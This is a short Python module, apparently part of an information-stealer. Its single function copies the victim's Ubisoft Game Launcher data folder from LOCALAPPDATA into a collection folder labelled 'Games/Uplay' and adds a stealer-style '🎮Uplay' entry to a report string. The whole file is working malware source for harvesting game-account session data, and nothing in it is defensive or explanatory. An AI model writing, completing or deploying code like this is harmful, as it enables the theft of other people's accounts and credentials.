from os import environ
from os.path import join
from shutil import copytree
from manager.logger import Log
from preferences.config import config

def Ubisoft():
    try:
        msgInfo = ""
        copytree(join(environ["LOCALAPPDATA"], "Ubisoft Game Launcher"), join(config.pathToLogs, "Games", "Uplay"))
        msgInfo+="\n∟🎮Uplay"
        return msgInfo
    except Exception as error:
        Log(f"Ubisoft(Uplay) ---> {error}")
        return msgInfo